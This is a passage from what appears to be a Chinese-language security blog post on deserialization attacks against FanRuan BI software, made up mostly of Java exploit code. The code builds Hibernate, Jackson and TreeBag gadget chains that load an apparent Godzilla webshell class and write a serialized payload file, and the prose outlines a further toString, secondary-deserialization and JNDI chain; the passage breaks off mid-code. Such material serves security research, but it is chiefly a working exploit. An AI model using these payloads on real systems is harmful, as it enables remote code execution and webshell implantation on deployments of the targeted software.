class="line"><span class="keyword">import</span> com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.hibernate.type.AbstractType;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.hibernate.type.ComponentType;</span><br><span class="line"><span class="keyword">import</span> com.fr.third.org.hibernate.type.Type;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.*;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.util.Reflections;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> me.gv7.woodpecker.yso.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.security.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">hiber_traabag</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isApplicableJavaVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAtLeast(<span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String[] getDependencies() &#123;</span><br><span class="line">        <span class="keyword">return</span> System.getProperty(<span class="string">&quot;hibernate5&quot;</span>) != <span class="literal">null</span> ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;com.fr.third.org.hibernate:hibernate-core:5.0.7.Final&quot;</span>, <span class="string">&quot;aopalliance:aopalliance:1.0&quot;</span>, <span class="string">&quot;com.fr.third.org.jboss.logging:jboss-logging:3.3.0.Final&quot;</span>, <span class="string">&quot;javax.transaction:javax.transaction-api:1.2&quot;</span>&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;com.fr.third.org.hibernate:hibernate-core:4.3.11.Final&quot;</span>, <span class="string">&quot;aopalliance:aopalliance:1.0&quot;</span>, <span class="string">&quot;com.fr.third.org.jboss.logging:jboss-logging:3.3.0.Final&quot;</span>, <span class="string">&quot;javax.transaction:javax.transaction-api:1.2&quot;</span>, <span class="string">&quot;dom4j:dom4j:1.6.1&quot;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeGetter</span><span class="params">(Class&lt;?&gt; tplClass, String method)</span> <span class="keyword">throws</span> NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> makeHibernate5Getter(tplClass, method);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeHibernate4Getter</span><span class="params">(Class&lt;?&gt; tplClass, String method)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; getterIf = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.Getter&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; basicGetter = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">        Reflections.setAccessible(bgCon);</span><br><span class="line">        <span class="keyword">if</span> (!method.startsWith(<span class="string">&quot;get&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Hibernate4 can only call getters&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">propName</span> <span class="operator">=</span> Character.toLowerCase(method.charAt(<span class="number">3</span>)) + method.substring(<span class="number">4</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">g</span> <span class="operator">=</span> bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">arr</span> <span class="operator">=</span> Array.newInstance(getterIf, <span class="number">1</span>);</span><br><span class="line">            Array.set(arr, <span class="number">0</span>, g);</span><br><span class="line">            <span class="keyword">return</span> arr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">makeHibernate5Getter</span><span class="params">(Class&lt;?&gt; tplClass, String method)</span> <span class="keyword">throws</span> NoSuchMethodException, SecurityException, ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; getterIf = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.access.spi.Getter&quot;</span>);</span><br><span class="line">        Class&lt;?&gt; basicGetter = Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">g</span> <span class="operator">=</span> bgCon.newInstance(tplClass, <span class="string">&quot;test&quot;</span>, tplClass.getDeclaredMethod(method));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">arr</span> <span class="operator">=</span> Array.newInstance(getterIf, <span class="number">1</span>);</span><br><span class="line">        Array.set(arr, <span class="number">0</span>, g);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> makeGetter(tpl.getClass(), <span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> makeCaller(tpl, getters);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">makeCaller</span><span class="params">(Object tpl, Object getters)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">return</span> makeHibernate45Caller(tpl, getters);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">makeHibernate45Caller</span><span class="params">(Object tpl, Object getters)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">PojoComponentTuplizer</span> <span class="variable">tup</span> <span class="operator">=</span> (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, <span class="string">&quot;getters&quot;</span>).set(tup, getters);</span><br><span class="line">        <span class="type">ComponentType</span> <span class="variable">t</span> <span class="operator">=</span> (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;componentTuplizer&quot;</span>, tup);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertySpan&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertyTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;t&#125;);</span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>(t, (Object)<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="type">TypedValue</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypedValue</span>(t, (Object)<span class="literal">null</span>);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="keyword">return</span> Gadgets.makeMap(v1, v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> Object <span class="title function_">makeHibernate3Caller</span><span class="params">(Object tpl, Object getters)</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">entityEntityModeToTuplizerMappingClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.tuple.entity.EntityEntityModeToTuplizerMapping&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">entityModeToTuplizerMappingClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.tuple.EntityModeToTuplizerMapping&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">typedValueClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.fr.third.org.hibernate.engine.TypedValue&quot;</span>);</span><br><span class="line">        <span class="type">PojoComponentTuplizer</span> <span class="variable">tup</span> <span class="operator">=</span> (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, <span class="string">&quot;getters&quot;</span>).set(tup, getters);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, <span class="string">&quot;propertySpan&quot;</span>).set(tup, <span class="number">1</span>);</span><br><span class="line">        <span class="type">ComponentType</span> <span class="variable">t</span> <span class="operator">=</span> (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hm</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hm.put(EntityMode.POJO, tup);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">emtm</span> <span class="operator">=</span> Reflections.createWithConstructor(entityEntityModeToTuplizerMappingClass, entityModeToTuplizerMappingClass, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;hm&#125;);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;tuplizerMapping&quot;</span>, emtm);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertySpan&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Reflections.setFieldValue(t, <span class="string">&quot;propertyTypes&quot;</span>, <span class="keyword">new</span> <span class="title class_">Type</span>[]&#123;t&#125;);</span><br><span class="line">        Constructor&lt;?&gt; typedValueConstructor = typedValueClass.getDeclaredConstructor(Type.class, Object.class, EntityMode.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">v1</span> <span class="operator">=</span> typedValueConstructor.newInstance(t, <span class="literal">null</span>, EntityMode.POJO);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v1, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">v2</span> <span class="operator">=</span> typedValueConstructor.newInstance(t, <span class="literal">null</span>, EntityMode.POJO);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;value&quot;</span>, tpl);</span><br><span class="line">        Reflections.setFieldValue(v2, <span class="string">&quot;type&quot;</span>, t);</span><br><span class="line">        <span class="keyword">return</span> Gadgets.makeMap(v1, v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">command</span> <span class="operator">=</span> <span class="string">&quot;class_file:E:\\finebi-2023\\godzila.class&quot;</span>;</span><br><span class="line">        <span class="comment">//final Object templates = Gadgets.createTemplatesImpl(command);</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> ClassPool.getDefault().get(<span class="string">&quot;com.fr.third.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);</span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">writeReplace</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;writeReplace&quot;</span>);</span><br><span class="line">        ctClass.removeMethod(writeReplace);</span><br><span class="line">        ctClass.toClass();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">tpl</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">getters</span> <span class="operator">=</span> makeGetter(tpl.getClass(), <span class="string">&quot;getOutputProperties&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objBefore</span> <span class="operator">=</span> makeCaller(tpl, getters);</span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        keyPairGenerator.initialize(<span class="number">1024</span>);</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> keyPairGenerator.genKeyPair();</span><br><span class="line">        <span class="type">PrivateKey</span> <span class="variable">privateKey</span> <span class="operator">=</span> keyPair.getPrivate();</span><br><span class="line">        <span class="type">Signature</span> <span class="variable">signingEngine</span> <span class="operator">=</span> Signature.getInstance(<span class="string">&quot;DSA&quot;</span>);</span><br><span class="line">        <span class="type">SignedObject</span> <span class="variable">signedObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SignedObject</span>((Serializable)objBefore,privateKey,signingEngine);<span class="comment">//get</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(signedObject);</span><br><span class="line">        <span class="type">NaturalOrderComparator</span> <span class="variable">NaturalOrderComparator</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NaturalOrderComparator</span>();<span class="comment">//tostring</span></span><br><span class="line">        <span class="type">TreeBag</span> <span class="variable">TreeBag</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">TreeBag</span>(NaturalOrderComparator);</span><br><span class="line">        TreeBag.add(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">mapField</span> <span class="operator">=</span> TreeBag.getClass().getSuperclass().getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        mapField.setAccessible(<span class="literal">true</span>); <span class="comment">// 使得 private 字段可访问</span></span><br><span class="line">        <span class="comment">//获取到treemap对象</span></span><br><span class="line">        Map&lt;?, ?&gt; superMap = (Map&lt;?, ?&gt;) mapField.get(TreeBag); <span class="comment">//treemap对象</span></span><br><span class="line">        <span class="comment">//获取treemap中的root属性</span></span><br><span class="line">        <span class="comment">//private transient Entry&lt;K,V&gt; root;</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">rootField</span> <span class="operator">=</span> superMap.getClass().getDeclaredField(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        rootField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">root</span> <span class="operator">=</span> rootField.get(superMap);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> root.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        keyField.set(root, jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">GZIPOutputStream</span> <span class="variable">gzout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GZIPOutputStream</span>(bao);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(gzout);</span><br><span class="line">        out.writeObject(TreeBag);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">        gzout.close();</span><br><span class="line">        FileUtils.writeByteArrayToFile(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;jackson_202303-godzila.ser&quot;</span>), bao.toByteArray());</span><br><span class="line">        <span class="comment">//SerializeUtil.serialize(superMap);</span></span><br><span class="line"><span class="comment">//        FileOutputStream fileOut = new FileOutputStream(&quot;jackson_202303.ser&quot;);</span></span><br><span class="line"><span class="comment">//        ObjectOutputStream out = new ObjectOutputStream(fileOut);</span></span><br><span class="line"><span class="comment">//        out.writeObject(TreeBag);</span></span><br><span class="line"><span class="comment">//        out.close();</span></span><br><span class="line"><span class="comment">//        fileOut.close();</span></span><br><span class="line"><span class="comment">//        SerializeUtil.deserialize(Files.readAllBytes(Paths.get(&quot;jackson_202303.ser&quot;)));</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="帆软新的tostring链和二次反序列化"><a href="#帆软新的tostring链和二次反序列化" class="headerlink" title="帆软新的tostring链和二次反序列化"></a>帆软新的tostring链和二次反序列化</h2><p>这是有一条新的tostring jdk的链子，通过tostring去触发jackson的JsonArray，jackson调用com.fr.third.alibaba.druid.pool.xa.DruidXADataSource#getXAConnection()方法调用hsqldb依赖的call方法调用公共静态类方法，如com&#x2F;fr&#x2F;third&#x2F;springframework&#x2F;util&#x2F;SerializationUtils.class<br>org&#x2F;terracotta&#x2F;modules&#x2F;ehcache&#x2F;collections&#x2F;SerializationHelper.class 造成二次反序列化。</p>
<h3 id="jndi触发链"><a href="#jndi触发链" class="headerlink" title="jndi触发链"></a>jndi触发链</h3><p>步骤一，利用hibernat生成序列化文件</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Array;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line">import java.util.zip.GZIPOutputStream;</span><br><span class="line">import com.fr.third.org.hibernate.EntityMode;</span><br><span class="line">import com.fr.third.org.hibernate.engine.spi.TypedValue;</span><br><span class="line">import com.fr.third.org.hibernate.tuple.component.AbstractComponentTuplizer;</span><br><span class="line">import com.fr.third.org.hibernate.tuple.component.PojoComponentTuplizer;</span><br><span class="line">import com.fr.third.org.hibernate.type.AbstractType;</span><br><span class="line">import com.fr.third.org.hibernate.type.ComponentType;</span><br><span class="line">import com.fr.third.org.hibernate.type.Type;</span><br><span class="line">import me.gv7.woodpecker.yso.payloads.*;</span><br><span class="line">import me.gv7.woodpecker.yso.payloads.annotation.Authors;</span><br><span class="line">import me.gv7.woodpecker.yso.payloads.annotation.PayloadTest;</span><br><span class="line">import me.gv7.woodpecker.yso.payloads.util.Gadgets;</span><br><span class="line">import me.gv7.woodpecker.yso.payloads.util.JavaVersion;</span><br><span class="line">import me.gv7.woodpecker.yso.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@PayloadTest(</span><br><span class="line">        precondition = &quot;&quot;</span><br><span class="line">)</span><br><span class="line">public class fr10chnel implements ObjectPayload&lt;Object&gt;, DynamicDependencies &#123;</span><br><span class="line">    public fr10chnel() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public static boolean isApplicableJavaVersion() &#123;</span><br><span class="line">        return JavaVersion.isAtLeast(8);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String[] getDependencies() &#123;</span><br><span class="line">        return System.getProperty(&quot;hibernate5&quot;) != null ? new String[]&#123;&quot;com.fr.third.org.hibernate:hibernate-core:5.0.7.Final&quot;, &quot;aopalliance:aopalliance:1.0&quot;, &quot;com.fr.third.org.jboss.logging:jboss-logging:3.3.0.Final&quot;, &quot;javax.transaction:javax.transaction-api:1.2&quot;&#125; : new String[]&#123;&quot;com.fr.third.org.hibernate:hibernate-core:4.3.11.Final&quot;, &quot;aopalliance:aopalliance:1.0&quot;, &quot;com.fr.third.org.jboss.logging:jboss-logging:3.3.0.Final&quot;, &quot;javax.transaction:javax.transaction-api:1.2&quot;, &quot;dom4j:dom4j:1.6.1&quot;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object makeGetter(Class&lt;?&gt; tplClass, String method) throws NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, ClassNotFoundException &#123;</span><br><span class="line">        return makeHibernate5Getter(tplClass, method);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object makeHibernate4Getter(Class&lt;?&gt; tplClass, String method) throws ClassNotFoundException, NoSuchMethodException, SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; getterIf = Class.forName(&quot;com.fr.third.org.hibernate.property.Getter&quot;);</span><br><span class="line">        Class&lt;?&gt; basicGetter = Class.forName(&quot;com.fr.third.org.hibernate.property.BasicPropertyAccessor$BasicGetter&quot;);</span><br><span class="line">        Constructor&lt;?&gt; bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);</span><br><span class="line">        Reflections.setAccessible(bgCon);</span><br><span class="line">        if (!method.startsWith(&quot;get&quot;)) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Hibernate4 can only call getters&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            String propName = Character.toLowerCase(method.charAt(3)) + method.substring(4);</span><br><span class="line">            Object g = bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);</span><br><span class="line">            Object arr = Array.newInstance(getterIf, 1);</span><br><span class="line">            Array.set(arr, 0, g);</span><br><span class="line">            return arr;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object makeHibernate5Getter(Class&lt;?&gt; tplClass, String method) throws NoSuchMethodException, SecurityException, ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException &#123;</span><br><span class="line">        Class&lt;?&gt; getterIf = Class.forName(&quot;com.fr.third.org.hibernate.property.access.spi.Getter&quot;);</span><br><span class="line">        Class&lt;?&gt; basicGetter = Class.forName(&quot;com.fr.third.org.hibernate.property.access.spi.GetterMethodImpl&quot;);</span><br><span class="line">        Constructor&lt;?&gt; bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);</span><br><span class="line">        Object g = bgCon.newInstance(tplClass, &quot;test&quot;, tplClass.getDeclaredMethod(method));</span><br><span class="line">        Object arr = Array.newInstance(getterIf, 1);</span><br><span class="line">        Array.set(arr, 0, g);</span><br><span class="line">        return arr;</span><br><span class="line">    &#125;</span><br><span class="line">    public Object getObject(String command) throws Exception &#123;</span><br><span class="line">        Object tpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line">        Object getters = makeGetter(tpl.getClass(), &quot;getOutputProperties&quot;);</span><br><span class="line">        return makeCaller(tpl, getters);</span><br><span class="line">    &#125;</span><br><span class="line">    static Object makeCaller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        return makeHibernate45Caller(tpl, getters);</span><br><span class="line">    &#125;</span><br><span class="line">    static Object makeHibernate45Caller(Object tpl, Object getters) throws NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException &#123;</span><br><span class="line">        PojoComponentTuplizer tup = (PojoComponentTuplizer)Reflections.createWithoutConstructor(PojoComponentTuplizer.class);</span><br><span class="line">        Reflections.getField(AbstractComponentTuplizer.class, &quot;getters&quot;).set(tup, getters);</span><br><span class="line">        ComponentType t = (ComponentType)Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);</span><br><span class="line">        Reflections.setFieldValue(t, &quot;componentTuplizer&quot;, tup);</span><br><span class="line">        Reflections.setFieldValue(t, &quot;propertySpan&quot;, 1);</span><br><span class="line">        Reflections.setFieldValue(t, &quot;propertyTypes&quot;, new Type[]&#123;t&#125;);</span><br><span class="line">        TypedValue v1 = new TypedValue(t, (Object)null);</span><br><span class="line">        Reflections.setFieldValue(v1, &quot;value&quot;, tpl);</span><br><span class="line">        Reflections.setFieldValue(v1, &quot;type&quot;, t);</span><br><span class="line">        TypedValue v2 = new TypedValue(t, (Object)null);</span><br><span class="line">        Reflections.setFieldValue(v2, 